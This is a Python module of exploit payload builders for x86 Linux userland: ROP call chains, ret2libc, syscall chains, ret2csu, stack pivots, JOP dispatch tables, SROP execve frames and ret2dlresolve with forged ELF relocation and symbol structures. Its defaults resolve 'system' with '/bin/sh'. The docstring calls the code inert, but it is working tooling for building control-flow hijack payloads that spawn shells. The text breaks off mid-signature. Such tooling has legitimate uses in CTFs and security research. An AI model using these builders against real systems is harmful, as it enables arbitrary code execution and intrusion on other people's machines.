"""Parameterized, inert userland ROP/JOP and dynamic-linker payload builders.

All addresses are caller supplied.  Builders only serialize bytes and return a
``PayloadBuild`` placement map; they never execute, connect, deliver, infer a
target address, or inspect a live process.
"""
from __future__ import annotations

from dataclasses import dataclass
import re
import struct
from typing import Iterable, Mapping, Sequence

try:  # package import and direct ``sys.path`` import are both supported
    from .contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
    from .gadget_catalog import GadgetCatalog
except ImportError:  # pragma: no cover - exercised by repository-style direct imports
    from contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
    from gadget_catalog import GadgetCatalog


MAX_PADDING = 4 * 1024 * 1024
MAX_CHAIN_WORDS = 4096


@dataclass(frozen=True)
class CallSpec:
    """One ABI call used by :func:`build_rop_calls`."""

    function: int
    arguments: tuple[int, ...] = ()
    name: str = "call"


_ABI = {
    "amd64": (64, "little", ("rdi", "rsi", "rdx", "rcx", "r8", "r9")),
    "i386": (32, "little", ()),
}

_SROP_OFFSETS = {
    "amd64": {
        "uc_flags": 0, "uc_link": 8, "ss_sp": 16, "ss_flags": 24, "ss_size": 32,
        "r8": 40, "r9": 48, "r10": 56, "r11": 64, "r12": 72, "r13": 80,
        "r14": 88, "r15": 96, "rdi": 104, "rsi": 112, "rbp": 120,
        "rbx": 128, "rdx": 136, "rax": 144, "rcx": 152, "rsp": 160,
        "rip": 168, "eflags": 176, "csgsfs": 184, "err": 192,
        "trapno": 200, "oldmask": 208, "cr2": 216, "fpstate": 224,
        "reserved": 232, "sigmask": 240,
    },
    "i386": {
        "gs": 0, "fs": 4, "es": 8, "ds": 12, "edi": 16, "esi": 20,
        "ebp": 24, "esp": 28, "ebx": 32, "edx": 36, "ecx": 40,
        "eax": 44, "trapno": 48, "err": 52, "eip": 56, "cs": 60,
        "eflags": 64, "esp_at_signal": 68, "ss": 72, "fpstate": 76,
    },
}
_SROP_LENGTH = {"amd64": 248, "i386": 80}


def glibc_profile(version: str) -> str:
    """Classify supported glibc releases without guessing a target version."""

    match = re.fullmatch(r"2\.(\d{1,2})", str(version))
    if not match:
        raise BuildError("glibc_version must look like '2.31'")
    minor = int(match.group(1))
    if not 17 <= minor <= 41:
        raise BuildError("supported glibc range is 2.17 through 2.41")
    if minor < 26:
        return "legacy"
    if minor < 34:
        return "tcache-hooks"
    if minor < 40:
        return "hookless"
    return "modern"


def _abi(architecture: str) -> tuple[int, str, tuple[str, ...]]:
    try:
        return _ABI[architecture]
    except KeyError as exc:
        raise BuildError(f"unsupported userland chain architecture: {architecture}") from exc


def _uint(value: int, bits: int, name: str) -> int:
    return ensure_uint(value, bits, name=name)


def _padding(offset: int, fill: bytes) -> bytes:
    if isinstance(offset, bool) or not isinstance(offset, int) or not 0 <= offset <= MAX_PADDING:
        raise BuildError(f"overflow_offset must be in 0..{MAX_PADDING}")
    if not isinstance(fill, bytes) or len(fill) != 1:
        raise BuildError("fill must be exactly one byte")
    return fill * offset


class _Words:
    def __init__(self, architecture: str, prefix: bytes = b"", *, base_address: int = 0):
        bits, endian, _registers = _abi(architecture)
        self.architecture = architecture
        self.bits = bits
        self.endian = endian
        self.word = bits // 8
        self.data = bytearray(prefix)
        self.placements: dict[str, int] = {}
        self.widths: dict[str, int] = {}
        self.base_address = _uint(base_address, bits, "base_address")
        if prefix:
            self.placements["padding"] = 0
            self.widths["padding"] = len(prefix)

    def add(self, label: str, value: int) -> int:
        if len(self.placements) > MAX_CHAIN_WORDS:
            raise BuildError("chain exceeds bounded word count")
        value = _uint(value, self.bits, label)
        if label in self.placements:
            raise BuildError(f"duplicate placement label: {label}")
        offset = len(self.data)
        self.data += value.to_bytes(self.word, self.endian)
        self.placements[label] = offset
        self.widths[label] = self.word
        return offset

    def add_bytes(self, label: str, value: bytes, *, align: int = 1, pad: bytes = b"\x00") -> int:
        if not isinstance(value, bytes):
            raise BuildError(f"{label} must be bytes")
        if not isinstance(align, int) or align < 1 or align > 4096 or align & (align - 1):
            raise BuildError("alignment must be a power of two in 1..4096")
        if not isinstance(pad, bytes) or len(pad) != 1:
            raise BuildError("pad must be one byte")
        needed = (-len(self.data)) % align
        self.data += pad * needed
        offset = len(self.data)
        self.data += value
        self.placements[label] = offset
        if value:
            self.widths[label] = len(value)
        return offset

    def patch(self, label: str, value: int) -> None:
        if label not in self.placements or self.widths.get(label) != self.word:
            raise BuildError(f"cannot patch non-word placement {label!r}")
        value = _uint(value, self.bits, label)
        offset = self.placements[label]
        self.data[offset:offset + self.word] = value.to_bytes(self.word, self.endian)

    def finish(
        self,
        strategy: str,
        *,
        metadata: Mapping[str, str] | None = None,
        bad_bytes: Iterable[int] = (),
    ) -> PayloadBuild:
        payload = bytes(self.data)
        reject_bad_bytes(payload, bad_bytes)
        return PayloadBuild(
            payload=payload,
            placements=self.placements,
            widths=self.widths,
            architecture=self.architecture,
            strategy=strategy,
            base_address=self.base_address,
            metadata=dict(metadata or {}),
        )


def build_ret2win(
    *,
    win_address: int,
    overflow_offset: int,
    architecture: str = "amd64",
    alignment_ret: int | None = None,
    return_address: int | None = None,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build a direct saved-PC overwrite with optional ABI alignment and return."""

    words = _Words(architecture, _padding(overflow_offset, fill))
    if alignment_ret is not None:
        words.add("alignment_ret", alignment_ret)
    words.add("win_address", win_address)
    if return_address is not None:
        words.add("return_address", return_address)
    return words.finish("ret2win", bad_bytes=bad_bytes)


def build_rop_calls(
    calls: Sequence[CallSpec],
    *,
    overflow_offset: int,
    architecture: str = "amd64",
    pop_gadgets: Mapping[str, int] | None = None,
    cleanup_gadgets: Mapping[int, int] | None = None,
    alignment_ret: int | None = None,
    final_return: int | None = None,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build one or more System-V ABI calls.

    AMD64 arguments use caller-supplied ``pop_<register>`` gadgets.  I386 uses
    cdecl stack arguments and requires an ``add esp, N; ret``-style cleanup
    gadget keyed by argument count for every call that has arguments.
    """

    if not calls or len(calls) > 128:
        raise BuildError("calls must contain 1..128 entries")
    words = _Words(architecture, _padding(overflow_offset, fill))
    bits, _endian, registers = _abi(architecture)
    if alignment_ret is not None:
        words.add("alignment_ret", alignment_ret)
    pops = dict(pop_gadgets or {})
    cleanups = dict(cleanup_gadgets or {})
    for index, call in enumerate(calls):
        if not isinstance(call, CallSpec) or not call.name:
            raise BuildError("calls must be non-empty named CallSpec instances")
        if len(call.arguments) > (6 if architecture == "amd64" else 32):
            raise BuildError(f"too many arguments for {architecture} call {index}")
        _uint(call.function, bits, f"call[{index}].function")
        if architecture == "amd64":
            for arg_index, argument in enumerate(call.arguments):
                register = registers[arg_index]
                gadget = pops.get(register, pops.get(f"pop {register} ; ret"))
                if gadget is None:
                    raise BuildError(f"missing pop gadget for {register}")
                words.add(f"call[{index}].pop_{register}", gadget)
                words.add(f"call[{index}].arg[{arg_index}]_{register}", argument)
            words.add(f"call[{index}].function_{call.name}", call.function)
        else:
            words.add(f"call[{index}].function_{call.name}", call.function)
            if call.arguments:
                cleanup = cleanups.get(len(call.arguments))
                if cleanup is None:
                    raise BuildError(
                        f"missing i386 cleanup gadget for {len(call.arguments)} arguments"
                    )
                words.add(f"call[{index}].cleanup", cleanup)
            else:
                # A zero-argument cdecl return naturally consumes the following word.
                continuation = calls[index + 1].function if index + 1 < len(calls) else final_return
                if continuation is None:
                    raise BuildError("zero-argument final i386 call needs final_return")
                words.add(f"call[{index}].return", continuation)
                if index + 1 < len(calls):
                    # The continuation function has already been serialized as the return PC.
                    raise BuildError("i386 zero-argument calls must be last in a multi-call chain")
            for arg_index, argument in enumerate(call.arguments):
                words.add(f"call[{index}].arg[{arg_index}]", argument)
    if architecture == "i386" and calls[-1].arguments:
        if final_return is None:
            raise BuildError("i386 call chain with stack arguments needs final_return")
        words.add("final_return", final_return)
    elif architecture == "amd64" and final_return is not None:
        words.add("final_return", final_return)
    return words.finish("rop-calls", bad_bytes=bad_bytes)


def build_rop_call(
    *,
    function: int,
    arguments: Sequence[int] = (),
    overflow_offset: int,
    architecture: str = "amd64",
    pop_gadgets: Mapping[str, int] | None = None,
    cleanup_gadget: int | None = None,
    alignment_ret: int | None = None,
    return_address: int | None = None,
    name: str = "target",
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Convenience wrapper for a single ABI call."""

    cleanups = {len(arguments): cleanup_gadget} if cleanup_gadget is not None else {}
    return build_rop_calls(
        (CallSpec(function, tuple(arguments), name),),
        overflow_offset=overflow_offset,
        architecture=architecture,
        pop_gadgets=pop_gadgets,
        cleanup_gadgets=cleanups,
        alignment_ret=alignment_ret,
        final_return=return_address,
        fill=fill,
        bad_bytes=bad_bytes,
    )


def _catalog_address(catalog: GadgetCatalog, *semantics: str) -> int:
    if not isinstance(catalog, GadgetCatalog):
        raise BuildError("catalog must be a GadgetCatalog")
    match = catalog.first(*semantics)
    if match is None:
        raise BuildError(f"catalog lacks gadget: {' or '.join(semantics)}")
    return match.address


def build_rop_call_from_catalog(
    catalog: GadgetCatalog,
    *,
    function: int,
    arguments: Sequence[int] = (),
    overflow_offset: int,
    return_address: int | None = None,
    align_stack: bool = False,
    name: str = "target",
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Select exact ABI gadgets from a supplied static catalog and build a call."""

    if catalog.architecture not in _ABI:
        raise BuildError(f"catalog architecture is unsupported: {catalog.architecture}")
    if catalog.architecture == "i386" and arguments:
        raise BuildError("catalog auto-call cannot infer i386 cleanup semantics; use build_rop_call")
    pops = {
        register: _catalog_address(catalog, f"pop {register} ; ret")
        for register in _ABI[catalog.architecture][2][:len(arguments)]
    }
    alignment = _catalog_address(catalog, "ret") if align_stack else None
    result = build_rop_call(
        function=function,
        arguments=arguments,
        overflow_offset=overflow_offset,
        architecture=catalog.architecture,
        pop_gadgets=pops,
        alignment_ret=alignment,
        return_address=return_address,
        name=name,
        fill=fill,
        bad_bytes=bad_bytes,
    )
    return PayloadBuild(
        result.payload, result.placements, result.widths,
        architecture=result.architecture,
        strategy="rop-call-from-catalog",
        metadata={"catalog_entry": hex(catalog.entry)},
    )


def build_ret2libc(
    *,
    system_address: int,
    command_address: int,
    overflow_offset: int,
    glibc_version: str,
    architecture: str = "amd64",
    pop_rdi: int | None = None,
    alignment_ret: int | None = None,
    exit_address: int | None = None,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build ``system(command)`` for supported glibc releases and x86 ABIs."""

    profile = glibc_profile(glibc_version)
    if architecture == "i386":
        # Classic cdecl layout: system's return PC is exit, followed by its
        # first stack argument.  No cleanup gadget is needed because exit does
        # not return in the intended path.
        words = _Words("i386", _padding(overflow_offset, fill))
        words.add("system", system_address)
        words.add("exit", exit_address if exit_address is not None else 0)
        words.add("command", command_address)
        result = words.finish("ret2libc-system", bad_bytes=bad_bytes)
    else:
        pops = {"rdi": pop_rdi} if pop_rdi is not None else {}
        result = build_rop_call(
            function=system_address,
            arguments=(command_address,),
            overflow_offset=overflow_offset,
            architecture=architecture,
            pop_gadgets=pops,
            alignment_ret=alignment_ret,
            return_address=exit_address if exit_address is not None else 0,
            name="system",
            fill=fill,
            bad_bytes=bad_bytes,
        )
    return PayloadBuild(
        payload=result.payload,
        placements=result.placements,
        widths=result.widths,
        architecture=result.architecture,
        strategy="ret2libc-system",
        base_address=result.base_address,
        metadata={"glibc_version": glibc_version, "glibc_profile": profile},
    )


def build_ret2libc_from_catalog(
    catalog: GadgetCatalog,
    *,
    system_address: int,
    command_address: int,
    overflow_offset: int,
    glibc_version: str,
    exit_address: int | None = None,
    align_stack: bool = True,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build ret2libc while selecting AMD64 pop/alignment gadgets statically."""

    if catalog.architecture != "amd64":
        raise BuildError("catalog ret2libc currently requires amd64")
    result = build_ret2libc(
        system_address=system_address,
        command_address=command_address,
        overflow_offset=overflow_offset,
        glibc_version=glibc_version,
        pop_rdi=_catalog_address(catalog, "pop rdi ; ret"),
        alignment_ret=_catalog_address(catalog, "ret") if align_stack else None,
        exit_address=exit_address,
        fill=fill,
        bad_bytes=bad_bytes,
    )
    return PayloadBuild(
        result.payload, result.placements, result.widths,
        architecture=result.architecture,
        strategy="ret2libc-from-catalog",
        metadata={**dict(result.metadata), "catalog_entry": hex(catalog.entry)},
    )


def build_syscall_rop(
    *,
    syscall_number: int,
    registers: Mapping[str, int],
    pop_gadgets: Mapping[str, int],
    syscall_gadget: int,
    overflow_offset: int,
    architecture: str = "amd64",
    return_address: int | None = None,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build a raw Linux syscall chain for AMD64 or I386."""

    order = (
        ("rax", "rdi", "rsi", "rdx", "r10", "r8", "r9")
        if architecture == "amd64"
        else ("eax", "ebx", "ecx", "edx", "esi", "edi", "ebp")
    )
    accumulator = order[0]
    supplied = dict(registers)
    supplied[accumulator] = syscall_number
    unknown = set(supplied) - set(order)
    if unknown:
        raise BuildError(f"unsupported syscall registers: {', '.join(sorted(unknown))}")
    words = _Words(architecture, _padding(overflow_offset, fill))
    for register in order:
        if register not in supplied:
            continue
        gadget = pop_gadgets.get(register, pop_gadgets.get(f"pop {register} ; ret"))
        if gadget is None:
            raise BuildError(f"missing pop gadget for {register}")
        words.add(f"pop_{register}", gadget)
        words.add(f"value_{register}", supplied[register])
    words.add("syscall_gadget", syscall_gadget)
    if return_address is not None:
        words.add("return_address", return_address)
    return words.finish("syscall-rop", bad_bytes=bad_bytes)


def build_syscall_rop_from_catalog(
    catalog: GadgetCatalog,
    *,
    syscall_number: int,
    registers: Mapping[str, int],
    overflow_offset: int,
    return_address: int | None = None,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Resolve pop/syscall addresses from a supplied ELF gadget catalog."""

    if catalog.architecture == "amd64":
        accumulator, terminal = "rax", ("syscall ; ret", "syscall")
    elif catalog.architecture == "i386":
        accumulator, terminal = "eax", ("int 0x80 ; ret", "int 0x80")
    else:
        raise BuildError("catalog syscall chains support amd64 and i386")
    requested = set(registers) | {accumulator}
    pops = {register: _catalog_address(catalog, f"pop {register} ; ret") for register in requested}
    result = build_syscall_rop(
        syscall_number=syscall_number,
        registers=registers,
        pop_gadgets=pops,
        syscall_gadget=_catalog_address(catalog, *terminal),
        overflow_offset=overflow_offset,
        architecture=catalog.architecture,
        return_address=return_address,
        fill=fill,
        bad_bytes=bad_bytes,
    )
    return PayloadBuild(
        result.payload, result.placements, result.widths,
        architecture=result.architecture,
        strategy="syscall-rop-from-catalog",
        metadata={"catalog_entry": hex(catalog.entry)},
    )


def build_ret2csu(
    *,
    csu_pop: int,
    csu_call: int,
    function_table: int,
    arg1: int,
    arg2: int,
    arg3: int,
    overflow_offset: int,
    return_address: int,
    variant: str = "r13-r14-r15",
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build either common AMD64 ``__libc_csu_init`` universal-call layout."""

    if arg1 >= (1 << 32):
        raise BuildError("classic ret2csu copies arg1 through a 32-bit register")
    if variant == "r13-r14-r15":
        values = {"rbx": 0, "rbp": 1, "r12": function_table,
                  "r13": arg1, "r14": arg2, "r15": arg3}
        call_base = "r12"
    elif variant == "r12-r13-r14":
        values = {"rbx": 0, "rbp": 1, "r12": arg1,
                  "r13": arg2, "r14": arg3, "r15": function_table}
        call_base = "r15"
    else:
        raise BuildError("variant must be 'r13-r14-r15' or 'r12-r13-r14'")
    words = _Words("amd64", _padding(overflow_offset, fill))
    words.add("csu_pop", csu_pop)
    for register in ("rbx", "rbp", "r12", "r13", "r14", "r15"):
        words.add(f"setup_{register}", values[register])
    words.add("csu_call", csu_call)
    for index in range(7):  # add rsp,8 plus six pops
        words.add(f"epilogue[{index}]", 0)
    words.add("return_address", return_address)
    return words.finish(
        "ret2csu",
        metadata={"variant": variant, "indirect_call_base": call_base},
        bad_bytes=bad_bytes,
    )


def build_ret2csu_from_catalog(
    catalog: GadgetCatalog,
    *,
    function_table: int,
    arg1: int,
    arg2: int,
    arg3: int,
    overflow_offset: int,
    return_address: int,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Select either recognized CSU pair from a supplied AMD64 catalog."""

    if catalog.architecture != "amd64":
        raise BuildError("ret2csu catalog must be amd64")
    pop = _catalog_address(catalog, "csu pop rbx rbp r12 r13 r14 r15 ; ret")
    standard = catalog.first("csu call [r12+rbx*8] (r13d,r14,r15)")
    alternate = catalog.first("csu call [r15+rbx*8] (r12d,r13,r14)")
    if standard is not None:
        call, variant = standard.address, "r13-r14-r15"
    elif alternate is not None:
        call, variant = alternate.address, "r12-r13-r14"
    else:
        raise BuildError("catalog lacks a recognized CSU call gadget")
    result = build_ret2csu(
        csu_pop=pop, csu_call=call, function_table=function_table,
        arg1=arg1, arg2=arg2, arg3=arg3, overflow_offset=overflow_offset,
        return_address=return_address, variant=variant, fill=fill,
        bad_bytes=bad_bytes,
    )
    return PayloadBuild(
        result.payload, result.placements, result.widths,
        architecture=result.architecture,
        strategy="ret2csu-from-catalog",
        metadata={**dict(result.metadata), "catalog_entry": hex(catalog.entry)},
    )


def build_stack_pivot(
    *,
    pivot_address: int,
    pivot_gadget: int,
    overflow_offset: int,
    architecture: str = "amd64",
    strategy: str = "pop-sp",
    setup_gadget: int | None = None,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build explicit pop-SP, exchange-accumulator/SP, or leave-ret pivots."""

    register_names = {
        "amd64": {"pop-sp": "rsp", "xchg-acc-sp": "rax", "leave-ret": "rbp"},
        "i386": {"pop-sp": "esp", "xchg-acc-sp": "eax", "leave-ret": "ebp"},
    }
    _abi(architecture)
    if strategy not in register_names[architecture]:
        raise BuildError("strategy must be pop-sp, xchg-acc-sp, or leave-ret")
    words = _Words(architecture, _padding(overflow_offset, fill))
    if strategy == "pop-sp":
        words.add("pop_stack_pointer", pivot_gadget)
        words.add("pivot_address", pivot_address)
    else:
        if setup_gadget is None:
            raise BuildError(f"{strategy} requires setup_gadget")
        words.add(f"pop_{register_names[architecture][strategy]}", setup_gadget)
        words.add("pivot_address", pivot_address)
        words.add("pivot_gadget", pivot_gadget)
    return words.finish(f"stack-pivot-{strategy}", bad_bytes=bad_bytes)


def build_jop_dispatch(
    *,
    dispatcher_gadget: int,
    functional_gadgets: Sequence[int],
    table_address: int,
    payload_address: int,
    overflow_offset: int,
    architecture: str = "amd64",
    pop_dispatch_register: int,
    dispatch_register: str = "rax",
    terminal_gadget: int | None = None,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build a JOP bootstrap and place its dispatch table at an exact address."""

    if not functional_gadgets or len(functional_gadgets) > 1024:
        raise BuildError("functional_gadgets must contain 1..1024 addresses")
    bits, _endian, _registers = _abi(architecture)
    valid = {"amd64": {"rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r12", "r13", "r14", "r15"},
             "i386": {"eax", "ebx", "ecx", "edx", "esi", "edi"}}
    if dispatch_register not in valid[architecture]:
        raise BuildError(f"invalid {architecture} dispatch register")
    words = _Words(
        architecture,
        _padding(overflow_offset, fill),
        base_address=_uint(payload_address, bits, "payload_address"),
    )
    words.add(f"pop_{dispatch_register}", pop_dispatch_register)
    words.add("table_address", table_address)
    words.add("dispatcher_gadget", dispatcher_gadget)
    minimum = len(words.data)
    if table_address < payload_address + minimum:
        raise BuildError("table_address overlaps the JOP bootstrap")
    gap = table_address - (payload_address + minimum)
    if gap > MAX_PADDING:
        raise BuildError("JOP table gap exceeds bounded payload size")
    if gap:
        words.add_bytes("table_gap", b"\x00" * gap)
    for index, gadget in enumerate(functional_gadgets):
        words.add(f"table[{index}]", gadget)
    if terminal_gadget is not None:
        words.add("table_terminal", terminal_gadget)
    return words.finish(
        "jop-dispatch-table",
        metadata={"dispatch_register": dispatch_register},
        bad_bytes=bad_bytes,
    )


def build_jop_dispatch_from_catalog(
    catalog: GadgetCatalog,
    *,
    dispatcher_semantic: str,
    functional_semantics: Sequence[str],
    table_address: int,
    payload_address: int,
    overflow_offset: int,
    dispatch_register: str = "rax",
    terminal_semantic: str | None = None,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Resolve a caller-chosen JOP vocabulary from a supplied gadget catalog."""

    if catalog.architecture not in _ABI:
        raise BuildError("JOP catalog must use amd64 or i386")
    if not dispatcher_semantic or not functional_semantics or any(not item for item in functional_semantics):
        raise BuildError("dispatcher and functional semantics must be non-empty")
    result = build_jop_dispatch(
        dispatcher_gadget=_catalog_address(catalog, dispatcher_semantic),
        functional_gadgets=tuple(_catalog_address(catalog, item) for item in functional_semantics),
        table_address=table_address,
        payload_address=payload_address,
        overflow_offset=overflow_offset,
        architecture=catalog.architecture,
        pop_dispatch_register=_catalog_address(catalog, f"pop {dispatch_register} ; ret"),
        dispatch_register=dispatch_register,
        terminal_gadget=(
            _catalog_address(catalog, terminal_semantic) if terminal_semantic is not None else None
        ),
        fill=fill,
        bad_bytes=bad_bytes,
    )
    return PayloadBuild(
        result.payload, result.placements, result.widths,
        architecture=result.architecture,
        strategy="jop-dispatch-from-catalog",
        base_address=result.base_address,
        metadata={**dict(result.metadata), "catalog_entry": hex(catalog.entry)},
    )


def build_sigreturn_frame(
    registers: Mapping[str, int],
    *,
    architecture: str = "amd64",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Serialize Linux x86 sigcontext layouts used by SROP."""

    if architecture not in _SROP_OFFSETS:
        raise BuildError("sigreturn frames support amd64 and i386")
    bits, endian, _args = _abi(architecture)
    offsets = _SROP_OFFSETS[architecture]
    unknown = set(registers) - set(offsets)
    if unknown:
        raise BuildError(f"unknown {architecture} sigreturn fields: {', '.join(sorted(unknown))}")
    frame = bytearray(_SROP_LENGTH[architecture])
    defaults = {"csgsfs": 0x33} if architecture == "amd64" else {"cs": 0x73, "ss": 0x7B}
    values = {**defaults, **dict(registers)}
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    word = bits // 8
    for name, value in values.items():
        _uint(value, bits, name)
        offset = offsets[name]
        frame[offset:offset + word] = value.to_bytes(word, endian)
        placements[f"frame.{name}"] = offset
        widths[f"frame.{name}"] = word
    payload = bytes(frame)
    reject_bad_bytes(payload, bad_bytes)
    return PayloadBuild(
        payload=payload,
        placements=placements,
        widths=widths,
        architecture=architecture,
        strategy="sigreturn-frame",
        metadata={"frame_layout": "linux-sigcontext"},
    )


def build_srop(
    *,
    frame_registers: Mapping[str, int],
    syscall_gadget: int,
    pop_accumulator: int,
    overflow_offset: int,
    architecture: str = "amd64",
    sigreturn_number: int | None = None,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build a sigreturn trigger followed by an exact sigcontext frame."""

    frame = build_sigreturn_frame(frame_registers, architecture=architecture)
    number = sigreturn_number if sigreturn_number is not None else (15 if architecture == "amd64" else 119)
    accumulator = "rax" if architecture == "amd64" else "eax"
    words = _Words(architecture, _padding(overflow_offset, fill))
    words.add(f"pop_{accumulator}", pop_accumulator)
    words.add("sigreturn_number", number)
    words.add("syscall_gadget", syscall_gadget)
    frame_start = words.add_bytes("sigreturn_frame", frame.payload)
    for label, offset in frame.placements.items():
        words.placements[label] = frame_start + offset
        words.widths[label] = frame.widths[label]
    return words.finish("srop-trigger", bad_bytes=bad_bytes)


def build_srop_execve(
    *,
    syscall_gadget: int,
    pop_accumulator: int,
    command_address: int,
    stack_address: int,
    overflow_offset: int,
    architecture: str = "amd64",
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build an SROP frame for ``execve(command, NULL, NULL)``."""

    if architecture == "amd64":
        registers = {"rax": 59, "rdi": command_address, "rsi": 0, "rdx": 0,
                     "rsp": stack_address, "rip": syscall_gadget}
    elif architecture == "i386":
        registers = {"eax": 11, "ebx": command_address, "ecx": 0, "edx": 0,
                     "esp": stack_address, "eip": syscall_gadget}
    else:
        raise BuildError("SROP execve supports amd64 and i386")
    result = build_srop(
        frame_registers=registers,
        syscall_gadget=syscall_gadget,
        pop_accumulator=pop_accumulator,
        overflow_offset=overflow_offset,
        architecture=architecture,
        fill=fill,
        bad_bytes=bad_bytes,
    )
    return PayloadBuild(
        payload=result.payload,
        placements=result.placements,
        widths=result.widths,
        architecture=result.architecture,
        strategy="srop-execve",
        metadata={"syscall": "execve"},
    )


def _align_congruent(offset: int, base: int, reference: int, modulus: int) -> int:
    """Smallest offset >= input whose absolute address matches reference mod N."""

    return offset + ((reference - (base + offset)) % modulus)


def build_ret2dlresolve(
    *,
    plt0: int,
    rel_plt: int,
    dynsym: int,
    dynstr: int,
    relocation_target: int,
    pop_rdi: int | None,
    payload_address: int,
    overflow_offset: int,
    glibc_version: str,
    architecture: str = "amd64",
    symbol: bytes = b"system",
    argument: bytes = b"/bin/sh\x00",
    resolver_return: int = 0,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Forge classic SysV lazy-binding structures and an invoking ROP chain.

    The forged structures are placed in this same contiguous payload.  Therefore
    ``payload_address`` must be the address where byte zero will reside.  AMD64
    uses an ``Elf64_Rela`` index; I386 uses an ``Elf32_Rel`` byte offset.
    """

    profile = glibc_profile(glibc_version)
    if architecture not in {"amd64", "i386"}:
        raise BuildError("ret2dlresolve supports amd64 and i386")
    bits, endian, _args = _abi(architecture)
    for name, value in {
        "plt0": plt0, "rel_plt": rel_plt, "dynsym": dynsym, "dynstr": dynstr,
        "relocation_target": relocation_target, "payload_address": payload_address,
        "resolver_return": resolver_return,
    }.items():
        _uint(value, bits, name)
    if not isinstance(symbol, bytes) or not symbol or b"\x00" in symbol or len(symbol) > 255:
        raise BuildError("symbol must be 1..255 non-NUL bytes")
    if not isinstance(argument, bytes) or not argument or len(argument) > 4096:
        raise BuildError("argument must be 1..4096 bytes")
    if not argument.endswith(b"\x00"):
        argument += b"\x00"

    words = _Words(
        architecture,
        _padding(overflow_offset, fill),
        base_address=payload_address,
    )
    if architecture == "amd64":
        if pop_rdi is None:
            raise BuildError("amd64 ret2dlresolve requires pop_rdi")
        words.add("pop_rdi", pop_rdi)
        words.add("argument_pointer", 0)
        words.add("plt0", plt0)
        words.add("relocation_selector", 0)
        words.add("resolver_return", resolver_return)
        rel_size, sym_size = 24, 24
    else:
        words.add("plt0", plt0)
        words.add("relocation_selector", 0)
        words.add("resolver_return", resolver_return)
        words.add("argument_pointer", 0)
        rel_size, sym_size = 8, 16

    # Keep forged tables congruent with the real tables so integer indices exist.
    rel_offset = _align_congruent(len(words.data), payload_address, rel_plt, rel_size)
    words.add_bytes("relocation_alignment", b"\x00" * (rel_offset - len(words.data))) if rel_offset > len(words.data) else None
    rel_offset = len(words.data)
    sym_min = rel_offset + rel_size
    sym_offset = _align_congruent(sym_min, payload_address, dynsym, sym_size)
    symbol_offset = sym_offset + sym_size
    argument_offset = symbol_offset + len(symbol) + 1
    rel_address = payload_address + rel_offset
    sym_address = payload_address + sym_offset
    symbol_address = payload_address + symbol_offset
    argument_address = payload_address + argument_offset
    if symbol_address < dynstr:
        raise BuildError("forged symbol name precedes dynstr; choose a higher payload_address")
    st_name = symbol_address - dynstr
    if st_name >= (1 << 32):
        raise BuildError("forged symbol-name offset does not fit Elf st_name")
    if sym_address < dynsym or (sym_address - dynsym) % sym_size:
        raise BuildError("forged symbol cannot be indexed from dynsym")
    sym_index = (sym_address - dynsym) // sym_size

    if architecture == "amd64":
        if sym_index >= (1 << 32):
            raise BuildError("forged Elf64 symbol index does not fit r_info")
        if rel_address < rel_plt or (rel_address - rel_plt) % rel_size:
            raise BuildError("forged Rela cannot be indexed from rel_plt")
        selector = (rel_address - rel_plt) // rel_size
        r_info = (sym_index << 32) | 7  # R_X86_64_JUMP_SLOT
        relocation = struct.pack("<QQq", relocation_target, r_info, 0)
        fake_symbol = struct.pack("<IBBHQQ", st_name, 0x12, 0, 0, 0, 0)
        selector_kind = "rela-index"
    else:
        if sym_index >= (1 << 24):
            raise BuildError("forged Elf32 symbol index does not fit r_info")
        if rel_address < rel_plt:
            raise BuildError("forged Rel precedes rel_plt")
        selector = rel_address - rel_plt
        r_info = (sym_index << 8) | 7  # R_386_JMP_SLOT
        relocation = struct.pack("<II", relocation_target, r_info)
        fake_symbol = struct.pack("<IIIBBH", st_name, 0, 0, 0x12, 0, 0)
        selector_kind = "rel-byte-offset"

    words.patch("argument_pointer", argument_address)
    words.patch("relocation_selector", selector)
    words.add_bytes("fake_relocation", relocation)
    if len(words.data) < sym_offset:
        words.add_bytes("symbol_alignment", b"\x00" * (sym_offset - len(words.data)))
    if len(words.data) != sym_offset:
        raise BuildError("internal forged-symbol placement mismatch")
    words.add_bytes("fake_symbol", fake_symbol)
    words.add_bytes("symbol_string", symbol + b"\x00")
    words.add_bytes("argument_string", argument)
    return words.finish(
        "ret2dlresolve",
        metadata={
            "glibc_version": glibc_version,
            "glibc_profile": profile,
            "selector_kind": selector_kind,
            "symbol": symbol.decode("ascii", "backslashreplace"),
        },
        bad_bytes=bad_bytes,
    )


def build_ret2dlresolve_from_catalog(
    catalog: GadgetCatalog,
    *,
    plt0: int,
    rel_plt: int,
    dynsym: int,
    dynstr: int,
    relocation_target: int,
    payload_address: int,
    overflow_offset: int,
    glibc_version: str,
    symbol: bytes = b"system",
    argument: bytes = b"/bin/sh\x00",
    resolver_return: int = 0,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
